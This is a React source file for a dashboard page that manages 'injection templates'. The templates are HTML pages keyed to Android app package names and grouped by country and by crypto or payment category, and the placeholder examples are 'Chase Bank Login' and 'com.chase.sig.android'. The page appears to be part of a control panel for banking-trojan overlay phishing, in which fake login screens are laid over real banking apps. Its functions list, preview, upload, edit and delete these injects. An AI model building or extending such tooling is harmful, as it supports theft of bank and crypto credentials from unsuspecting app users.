import { useEffect, useState, useMemo, useCallback } from "react"
import { api } from "../api/client"

/* 国家对应的旗帜 emoji */
const countryFlags = {
  "中国": "🇨🇳", "美国": "🇺🇸", "加拿大": "🇨🇦", "英国": "🇬🇧",
  "澳大利亚": "🇦🇺", "西班牙": "🇪🇸", "德国": "🇩🇪", "法国": "🇫🇷",
  "意大利": "🇮🇹", "日本": "🇯🇵", "韩国": "🇰🇷", "印度": "🇮🇳",
  "巴西": "🇧🇷", "波兰": "🇵🇱", "土耳其": "🇹🇷", "罗马尼亚": "🇷🇴",
  "智利": "🇨🇱", "葡萄牙": "🇵🇹", "以色列": "🇮🇱", "荷兰": "🇳🇱",
  "奥地利": "🇦🇹", "比利时": "🇧🇪", "捷克": "🇨🇿", "克罗地亚": "🇭🇷",
  "新西兰": "🇳🇿", "墨西哥": "🇲🇽", "危地马拉": "🇬🇹", "摩洛哥": "🇲🇦",
  "印尼": "🇮🇩", "菲律宾": "🇵🇭", "香港": "🇭🇰", "阿根廷": "🇦🇷", "玻利维亚": "🇧🇴",
  "加密货币": "₿", "国际支付": "💳", "国际平台": "🌐", "国际/其他": "🌍"
}

export default function InjPage() {
  const [templates, setTemplates] = useState([])
  const [loading, setLoading] = useState(true)
  const [search, setSearch] = useState("")
  const [selectedCountry, setSelectedCountry] = useState(null) // 卡片式国家选项卡

  /* 编辑/预览模态框状态 */
  const [editModal, setEditModal] = useState({ open: false, id: null, name: '', content: '' })
  const [previewModal, setPreviewModal] = useState({ open: false, id: null, name: '', content: '' })
  const [saving, setSaving] = useState(false)

  /* 新增模板模态框状态 */
  const [addModal, setAddModal] = useState({ open: false, name: '', packageName: '', templateId: '', htmlContent: '', showPreview: false })
  const [addSaving, setAddSaving] = useState(false)

  /* 判断是否是管理员 — 通过 verify API 返回的角色判断 */
  const [isAdmin, setIsAdmin] = useState(false)
  useEffect(() => {
    api.request('/api/auth/verify').then(r => {
      const role = r?.data?.role || r?.role || ''
      setIsAdmin(role === 'admin' || role === 'superadmin' || role === 'super-admin')
    }).catch(() => {})
  }, [])

  const loadTpl = useCallback(async () => {
    setLoading(true)
    try {
      const r = await api.request("/api/injection/templates")
      setTemplates(r.data?.templates || r.templates || r.data || r || [])
    } catch (e) {
      console.error(e)
    } finally {
      setLoading(false)
    }
  }, [])

  useEffect(() => { loadTpl() }, [loadTpl])

  /* 按国家分组 - 直接使用数据库返回的 country 字段 */
  const grouped = useMemo(() => {
    const map = {}
    for (const tpl of templates) {
      const country = (tpl.country && tpl.country.trim()) || '其他'
      if (!map[country]) map[country] = []
      map[country].push(tpl)
    }
    // 按数量排序
    return Object.entries(map).sort((a, b) => b[1].length - a[1].length)
  }, [templates])

  /* 搜索过滤 + 国家卡片筛选 */
  const filteredGrouped = useMemo(() => {
    let result = grouped
    // 国家卡片筛选
    if (selectedCountry) {
      result = result.filter(([country]) => country === selectedCountry)
    }
    // 搜索过滤
    if (search.trim()) {
      const s = search.toLowerCase()
      result = result
        .map(([country, tpls]) => {
          const filtered = tpls.filter(t =>
            (t.name || "").toLowerCase().includes(s) ||
            (t.packageName || t.package_name || "").toLowerCase().includes(s)
          )
          return [country, filtered]
        })
        .filter(([, tpls]) => tpls.length > 0)
    }
    return result
  }, [grouped, search, selectedCountry])

  const totalCount = templates.length
  const countryCount = grouped.length


  /* 打开编辑模态框 */
  const openEdit = async (tpl) => {
    try {
      const tplId = tpl.packageName || tpl.package_name || tpl.id || tpl.template_id
      const r = await api.request(`/api/injection/templates/${encodeURIComponent(tplId)}`)
      const content = r.data?.htmlContent || r.htmlContent || r.data?.html_content || r.html_content || ''
      setEditModal({ open: true, id: tplId, name: tpl.name, content, showPreview: false })
    } catch (e) {
      alert('获取模板内容失败: ' + e.message)
    }
  }

  /* 保存编辑 */
  const saveEdit = async () => {
    setSaving(true)
    try {
      await api.request(`/api/injection/templates/${encodeURIComponent(editModal.id)}`, {
        method: 'PUT',
        body: JSON.stringify({ htmlContent: editModal.content }),
        headers: { 'Content-Type': 'application/json' }
      })
      setEditModal({ open: false, id: null, name: '', content: '', showPreview: false })
      alert('保存成功')
    } catch (e) {
      alert('保存失败: ' + e.message)
    } finally {
      setSaving(false)
    }
  }

  /* 打开预览模态框 */
  const openPreview = async (tpl) => {
    try {
      const tplId = tpl.packageName || tpl.package_name || tpl.id || tpl.template_id
      const r = await api.request(`/api/injection/templates/${encodeURIComponent(tplId)}`)
      const content = r.data?.htmlContent || r.htmlContent || r.data?.html_content || r.html_content || ''
      setPreviewModal({ open: true, id: tpl.id || tpl.template_id, name: tpl.name, content })
    } catch (e) {
      alert('获取模板内容失败: ' + e.message)
    }
  }

  /* 删除模板 */
  const deleteTemplate = async (tpl) => {
    const tplId = tpl.packageName || tpl.package_name || tpl.id || tpl.template_id
    if (!confirm('确认删除此模板？')) return
    try {
      await api.request('/api/injection/templates/' + encodeURIComponent(tplId), { method: 'DELETE' })
      loadTpl()
    } catch (e) {
      alert('删除失败: ' + e.message)
    }
  }

  /* 新增模板 */
  const submitAddTemplate = async () => {
    if (!addModal.name.trim() || !addModal.packageName.trim()) {
      alert('模板名称和包名为必填项')
      return
    }
    setAddSaving(true)
    try {
      await api.request('/api/injection/template', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: addModal.name.trim(),
          packageName: addModal.packageName.trim(),
          templateId: addModal.templateId.trim() || undefined,
          htmlContent: addModal.htmlContent
        })
      })
      setAddModal({ open: false, name: '', packageName: '', templateId: '', htmlContent: '', showPreview: false })
      alert('新增成功')
      loadTpl()
    } catch (e) {
      alert('新增失败: ' + e.message)
    } finally {
      setAddSaving(false)
    }
  }

  /* 上传 HTML 文件 */
  const handleHtmlFileUpload = (e) => {
    const file = e.target.files[0]
    if (!file) return
    const reader = new FileReader()
    reader.onload = (ev) => {
      setAddModal(prev => ({ ...prev, htmlContent: ev.target.result }))
    }
    reader.readAsText(file)
  }

  /* 当前展示的模板列表（基于国家卡片选中状态） */
  const displayTemplates = useMemo(() => {
    if (!selectedCountry) {
      // 没选国家时显示所有（按 filteredGrouped 展开）
      return filteredGrouped.flatMap(([, tpls]) => tpls)
    }
    const found = filteredGrouped.find(([c]) => c === selectedCountry)
    return found ? found[1] : []
  }, [filteredGrouped, selectedCountry])

  return (
    <section className="panel injection-panel" style={{ padding: 24 }}>
      {/* 头部 */}
      <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 20, flexWrap: "wrap" }}>
        <h3 style={{ margin: 0, fontSize: 20, fontWeight: 600, color: "#e0d0f0", display: "flex", alignItems: "center", gap: 8 }}>
          🌐 注入模板
        </h3>
        <span style={{
          background: "rgba(168,85,247,.12)", border: "1px solid rgba(168,85,247,.2)",
          borderRadius: 20, padding: "4px 12px", fontSize: 12, color: "#c084fc"
        }}>
          {totalCount} 个模板 · {countryCount} 个国家/地区
        </span>
        <div style={{ marginLeft: "auto", display: "flex", gap: 8 }}>
          {isAdmin && (
            <button
              className="rc-btn"
              onClick={() => setAddModal({ open: true, name: '', packageName: '', templateId: '', htmlContent: '', showPreview: false })}
              style={{ padding: "6px 14px", fontSize: 12, borderRadius: 8, border: "1px solid rgba(34,197,94,.3)", background: "rgba(34,197,94,.1)", color: "#22c55e", cursor: "pointer", fontWeight: 600 }}
            >＋ 新增模板</button>
          )}
          <button className="rc-btn" onClick={loadTpl} style={btnStyle}>{loading ? "⟳ 加载中..." : "⟳ 刷新"}</button>
        </div>
      </div>

      {/* 搜索框 */}
      <div style={{ marginBottom: 16 }}>
        <input
          type="text"
          value={search}
          onChange={e => setSearch(e.target.value)}
          placeholder="🔍 搜索模板名称或包名..."
          style={{
            width: "100%", maxWidth: 400, padding: "10px 16px",
            background: "rgba(255,255,255,.04)", border: "1px solid rgba(168,85,247,.15)",
            borderRadius: 10, color: "#d0c0e0", fontSize: 14, outline: "none",
            transition: "border-color .2s"
          }}
          onFocus={e => e.target.style.borderColor = "rgba(168,85,247,.4)"}
          onBlur={e => e.target.style.borderColor = "rgba(168,85,247,.15)"}
        />
      </div>

      {/* 国家卡片式选项卡 */}
      <div style={{
        display: "flex", gap: 8, overflowX: "auto", paddingBottom: 12, marginBottom: 16,
        scrollbarWidth: "thin", scrollbarColor: "rgba(168,85,247,.3) transparent"
      }}>
        {/* 全部 tab */}
        <div
          onClick={() => setSelectedCountry(null)}
          style={{
            flexShrink: 0, padding: "8px 16px", borderRadius: 10, cursor: "pointer",
            border: !selectedCountry ? "1px solid rgba(168,85,247,.5)" : "1px solid rgba(168,85,247,.12)",
            background: !selectedCountry ? "rgba(168,85,247,.15)" : "rgba(255,255,255,.03)",
            color: !selectedCountry ? "#c084fc" : "#8b7aaa",
            transition: "all .2s", userSelect: "none", textAlign: "center", minWidth: 60
          }}
        >
          <div style={{ fontSize: 13, fontWeight: 600 }}>全部</div>
          <div style={{ fontSize: 11, marginTop: 2, opacity: .7 }}>{totalCount}</div>
        </div>
        {grouped.map(([country, tpls]) => {
          const flag = countryFlags[country] || "🏳️"
          const isActive = selectedCountry === country
          return (
            <div
              key={country}
              onClick={() => setSelectedCountry(isActive ? null : country)}
              style={{
                flexShrink: 0, padding: "8px 14px", borderRadius: 10, cursor: "pointer",
                border: isActive ? "1px solid rgba(168,85,247,.5)" : "1px solid rgba(168,85,247,.12)",
                background: isActive ? "rgba(168,85,247,.15)" : "rgba(255,255,255,.03)",
                color: isActive ? "#c084fc" : "#8b7aaa",
                transition: "all .2s", userSelect: "none", textAlign: "center", minWidth: 70
              }}
            >
              <div style={{ fontSize: 16 }}>{flag}</div>
              <div style={{ fontSize: 12, fontWeight: 500, marginTop: 2, whiteSpace: "nowrap" }}>{country}</div>
              <div style={{ fontSize: 11, marginTop: 2, opacity: .7 }}>{tpls.length}</div>
            </div>
          )
        })}
      </div>

      {/* 模板列表 */}
      {loading ? (
        <div style={{ padding: 60, textAlign: "center", color: "#8b949e" }}>加载中...</div>
      ) : displayTemplates.length === 0 ? (
        <div style={{ padding: 60, textAlign: "center", color: "#8b949e" }}>暂无匹配模板</div>
      ) : (
        <div style={{
          display: "grid",
          gridTemplateColumns: "repeat(auto-fill, minmax(340px, 1fr))",
          gap: 10
        }}>
          {displayTemplates.map(tpl => (
            <div key={tpl.id || tpl.template_id || (tpl.packageName || tpl.package_name)} style={{
              display: "flex", alignItems: "center", gap: 10,
              padding: "12px 14px", borderRadius: 10,
              background: "rgba(255,255,255,.02)",
              border: "1px solid rgba(168,85,247,.08)",
              transition: "all .15s"
            }}
              onMouseEnter={e => {
                e.currentTarget.style.background = "rgba(168,85,247,.06)"
                e.currentTarget.style.borderColor = "rgba(168,85,247,.2)"
              }}
              onMouseLeave={e => {
                e.currentTarget.style.background = "rgba(255,255,255,.02)"
                e.currentTarget.style.borderColor = "rgba(168,85,247,.08)"
              }}
            >
              {/* 模板图标 */}
              <div style={{
                width: 36, height: 36, borderRadius: 8,
                background: `${getColor(tpl.name)}18`,
                border: `1px solid ${getColor(tpl.name)}30`,
                display: "flex", alignItems: "center", justifyContent: "center",
                fontSize: 14, fontWeight: 700, color: getColor(tpl.name), flexShrink: 0
              }}>
                {(tpl.name || "?")[0]}
              </div>

              {/* 名称和包名 */}
              <div style={{ flex: 1, minWidth: 0 }}>
                <div style={{
                  fontSize: 13, fontWeight: 500, color: "#c8b8e0",
                  overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap"
                }}>
                  {tpl.name}
                </div>
                <div style={{
                  fontSize: 11, color: "#6b5a80", marginTop: 2,
                  overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap",
                  fontFamily: "monospace"
                }}>
                  {tpl.packageName || tpl.package_name || "\u2014"}
                </div>
              </div>

              {/* 操作按钮：编辑和预览对所有用户开放，删除仅管理员 */}
              <div style={{ display: 'flex', gap: 4, flexShrink: 0 }}>
                <button
                  onClick={(e) => { e.stopPropagation(); openEdit(tpl) }}
                  style={{ padding: '3px 8px', fontSize: 10, borderRadius: 4, border: '1px solid rgba(168,85,247,.3)', background: 'rgba(168,85,247,.1)', color: '#a855f7', cursor: 'pointer' }}
                >✏️编辑</button>
                <button
                  onClick={(e) => { e.stopPropagation(); openPreview(tpl) }}
                  style={{ padding: '3px 8px', fontSize: 10, borderRadius: 4, border: '1px solid rgba(56,189,248,.3)', background: 'rgba(56,189,248,.1)', color: '#38bdf8', cursor: 'pointer' }}
                >👁预览</button>
                {isAdmin && (
                  <button
                    onClick={(e) => { e.stopPropagation(); deleteTemplate(tpl) }}
                    style={{ padding: '3px 8px', fontSize: 10, borderRadius: 4, border: '1px solid rgba(239,68,68,.3)', background: 'rgba(239,68,68,.1)', color: '#ef4444', cursor: 'pointer' }}
                  >🗑删除</button>
                )}
              </div>
            </div>
          ))}
        </div>
      )}

      {/* 编辑模态框 */}
      {editModal.open && (
        <div style={{
          position: 'fixed', inset: 0, zIndex: 9999,
          background: 'rgba(0,0,0,.6)', display: 'flex', alignItems: 'center', justifyContent: 'center'
        }} onClick={() => setEditModal({ open: false, id: null, name: '', content: '', showPreview: false })}>
          <div style={{
            background: '#1a1028', border: '1px solid rgba(168,85,247,.3)', borderRadius: 12,
            padding: 24, width: '95%', maxWidth: 1100, maxHeight: '90vh', display: 'flex', flexDirection: 'column', gap: 12
          }} onClick={e => e.stopPropagation()}>
            <h4 style={{ margin: 0, color: '#e0d0f0', fontSize: 16 }}>✏️ 编辑模板: {editModal.name}</h4>
            <div style={{ display: 'flex', gap: 12, flex: 1, minHeight: 0 }}>
              <textarea
                value={editModal.content}
                onChange={e => setEditModal(prev => ({ ...prev, content: e.target.value }))}
                style={{
                  flex: 1, minHeight: 350, padding: 12, borderRadius: 8,
                  background: 'rgba(0,0,0,.3)', border: '1px solid rgba(168,85,247,.2)',
                  color: '#d0c0e0', fontSize: 13, fontFamily: 'monospace', resize: 'none', outline: 'none'
                }}
              />
              {editModal.showPreview && (
                <div style={{ flex: 1, borderRadius: 8, border: '1px solid rgba(56,189,248,.3)', overflow: 'hidden', background: '#fff' }}>
                  <iframe
                    srcDoc={editModal.content}
                    style={{ width: '100%', height: '100%', border: 'none', minHeight: 350 }}
                    sandbox="allow-scripts"
                    title="preview"
                  />
                </div>
              )}
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between', gap: 8 }}>
              <button
                onClick={() => setEditModal(prev => ({ ...prev, showPreview: !prev.showPreview }))}
                style={{ padding: '8px 16px', borderRadius: 6, border: '1px solid rgba(56,189,248,.3)', background: 'rgba(56,189,248,.1)', color: '#38bdf8', cursor: 'pointer' }}
              >{editModal.showPreview ? '🔒 隐藏预览' : '👁 实时预览'}</button>
              <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
                {!isAdmin && (
                  <span style={{ fontSize: 11, color: '#f59e0b', background: 'rgba(245,158,11,.1)', border: '1px solid rgba(245,158,11,.2)', borderRadius: 4, padding: '4px 10px' }}>
                    🔒 只读模式（无法保存到数据库）
                  </span>
                )}
                <button
                  onClick={() => setEditModal({ open: false, id: null, name: '', content: '', showPreview: false })}
                  style={{ padding: '8px 16px', borderRadius: 6, border: '1px solid rgba(255,255,255,.1)', background: 'rgba(255,255,255,.05)', color: '#aaa', cursor: 'pointer' }}
                >取消</button>
                {isAdmin && (
                  <button
                    onClick={saveEdit}
                    disabled={saving}
                    style={{ padding: '8px 16px', borderRadius: 6, border: '1px solid rgba(168,85,247,.4)', background: 'rgba(168,85,247,.2)', color: '#c084fc', cursor: 'pointer' }}
                  >{saving ? '保存中...' : '💾 保存'}</button>
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* 预览模态框 */}
      {previewModal.open && (
        <div style={{
          position: 'fixed', inset: 0, zIndex: 9999,
          background: 'rgba(0,0,0,.6)', display: 'flex', alignItems: 'center', justifyContent: 'center'
        }} onClick={() => setPreviewModal({ open: false, id: null, name: '', content: '' })}>
          <div style={{
            background: '#1a1028', border: '1px solid rgba(56,189,248,.3)', borderRadius: 12,
            padding: 24, width: '90%', maxWidth: 800, maxHeight: '85vh', display: 'flex', flexDirection: 'column', gap: 12
          }} onClick={e => e.stopPropagation()}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
              <h4 style={{ margin: 0, color: '#e0d0f0', fontSize: 16 }}>👁 预览: {previewModal.name}</h4>
              <button
                onClick={() => setPreviewModal({ open: false, id: null, name: '', content: '' })}
                style={{ padding: '4px 12px', borderRadius: 6, border: '1px solid rgba(255,255,255,.1)', background: 'rgba(255,255,255,.05)', color: '#aaa', cursor: 'pointer' }}
              >✕ 关闭</button>
            </div>
            <iframe
              srcDoc={previewModal.content}
              style={{
                flex: 1, minHeight: 400, width: '100%', borderRadius: 8,
                border: '1px solid rgba(56,189,248,.2)', background: '#fff'
              }}
              sandbox="allow-scripts"
              title="模板预览"
            />
          </div>
        </div>
      )}

      {/* 新增模板模态框 */}
      {addModal.open && (
        <div style={{
          position: 'fixed', inset: 0, zIndex: 9999,
          background: 'rgba(0,0,0,.6)', display: 'flex', alignItems: 'center', justifyContent: 'center'
        }} onClick={() => setAddModal({ open: false, name: '', packageName: '', templateId: '', htmlContent: '', showPreview: false })}>
          <div style={{
            background: '#1a1028', border: '1px solid rgba(34,197,94,.3)', borderRadius: 12,
            padding: 24, width: '95%', maxWidth: 900, maxHeight: '90vh', display: 'flex', flexDirection: 'column', gap: 14, overflow: 'auto'
          }} onClick={e => e.stopPropagation()}>
            <h4 style={{ margin: 0, color: '#e0d0f0', fontSize: 16 }}>＋ 新增模板</h4>

            {/* 表单字段 */}
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
              <div>
                <label style={{ fontSize: 12, color: '#8b7aaa', marginBottom: 4, display: 'block' }}>模板名称 *</label>
                <input
                  type="text" value={addModal.name}
                  onChange={e => setAddModal(prev => ({ ...prev, name: e.target.value }))}
                  placeholder="例：Chase Bank Login"
                  style={{ width: '100%', padding: '8px 12px', borderRadius: 6, border: '1px solid rgba(168,85,247,.2)', background: 'rgba(0,0,0,.3)', color: '#d0c0e0', fontSize: 13, outline: 'none' }}
                />
              </div>
              <div>
                <label style={{ fontSize: 12, color: '#8b7aaa', marginBottom: 4, display: 'block' }}>包名 *</label>
                <input
                  type="text" value={addModal.packageName}
                  onChange={e => setAddModal(prev => ({ ...prev, packageName: e.target.value }))}
                  placeholder="例：com.chase.sig.android"
                  style={{ width: '100%', padding: '8px 12px', borderRadius: 6, border: '1px solid rgba(168,85,247,.2)', background: 'rgba(0,0,0,.3)', color: '#d0c0e0', fontSize: 13, outline: 'none' }}
                />
              </div>
              <div style={{ gridColumn: '1 / -1' }}>
                <label style={{ fontSize: 12, color: '#8b7aaa', marginBottom: 4, display: 'block' }}>模板 ID（可选，留空自动生成）</label>
                <input
                  type="text" value={addModal.templateId}
                  onChange={e => setAddModal(prev => ({ ...prev, templateId: e.target.value }))}
                  placeholder="留空后端自动生成 tpl-xxxxx"
                  style={{ width: '100%', padding: '8px 12px', borderRadius: 6, border: '1px solid rgba(168,85,247,.2)', background: 'rgba(0,0,0,.3)', color: '#d0c0e0', fontSize: 13, outline: 'none' }}
                />
              </div>
            </div>

            {/* HTML 内容 */}
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 6 }}>
                <label style={{ fontSize: 12, color: '#8b7aaa' }}>HTML 内容</label>
                <label style={{ fontSize: 11, color: '#38bdf8', cursor: 'pointer', border: '1px solid rgba(56,189,248,.3)', borderRadius: 4, padding: '2px 8px', background: 'rgba(56,189,248,.05)' }}>
                  📁 上传 .html 文件
                  <input type="file" accept=".html,.htm" onChange={handleHtmlFileUpload} style={{ display: 'none' }} />
                </label>
              </div>
              <div style={{ display: 'flex', gap: 12, flex: 1, minHeight: 0 }}>
                <textarea
                  value={addModal.htmlContent}
                  onChange={e => setAddModal(prev => ({ ...prev, htmlContent: e.target.value }))}
                  placeholder="在此输入或粘贴 HTML 内容..."
                  style={{
                    flex: 1, minHeight: 250, padding: 12, borderRadius: 8,
                    background: 'rgba(0,0,0,.3)', border: '1px solid rgba(168,85,247,.2)',
                    color: '#d0c0e0', fontSize: 13, fontFamily: 'monospace', resize: 'vertical', outline: 'none'
                  }}
                />
                {addModal.showPreview && (
                  <div style={{ flex: 1, borderRadius: 8, border: '1px solid rgba(56,189,248,.3)', overflow: 'hidden', background: '#fff' }}>
                    <iframe
                      srcDoc={addModal.htmlContent}
                      style={{ width: '100%', height: '100%', border: 'none', minHeight: 250 }}
                      sandbox="allow-scripts"
                      title="新增预览"
                    />
                  </div>
                )}
              </div>
            </div>

            {/* 操作按钮 */}
            <div style={{ display: 'flex', justifyContent: 'space-between', gap: 8 }}>
              <button
                onClick={() => setAddModal(prev => ({ ...prev, showPreview: !prev.showPreview }))}
                style={{ padding: '8px 16px', borderRadius: 6, border: '1px solid rgba(56,189,248,.3)', background: 'rgba(56,189,248,.1)', color: '#38bdf8', cursor: 'pointer' }}
              >{addModal.showPreview ? '🔒 隐藏预览' : '👁 预览 HTML'}</button>
              <div style={{ display: 'flex', gap: 8 }}>
                <button
                  onClick={() => setAddModal({ open: false, name: '', packageName: '', templateId: '', htmlContent: '', showPreview: false })}
                  style={{ padding: '8px 16px', borderRadius: 6, border: '1px solid rgba(255,255,255,.1)', background: 'rgba(255,255,255,.05)', color: '#aaa', cursor: 'pointer' }}
                >取消</button>
                <button
                  onClick={submitAddTemplate}
                  disabled={addSaving}
                  style={{ padding: '8px 16px', borderRadius: 6, border: '1px solid rgba(34,197,94,.4)', background: 'rgba(34,197,94,.15)', color: '#22c55e', cursor: 'pointer', fontWeight: 600 }}
                >{addSaving ? '提交中...' : '✓ 确认新增'}</button>
              </div>
            </div>
          </div>
        </div>
      )}
    </section>
  )
}

/* 辅助：根据名称生成颜色 */
function getColor(name) {
  const colors = ["#a855f7", "#e74c3c", "#d4af37", "#1890ff", "#52c41a", "#f87171", "#fbbf24", "#7c3aed", "#06b6d4", "#ec4899"]
  return colors[(name || "").length % colors.length]
}

/* 按钮基础样式 */
const btnStyle = {
  padding: "6px 14px", fontSize: 12, borderRadius: 8,
  border: "1px solid rgba(168,85,247,.15)", background: "rgba(255,255,255,.03)",
  color: "#b8a0c8", cursor: "pointer"
}
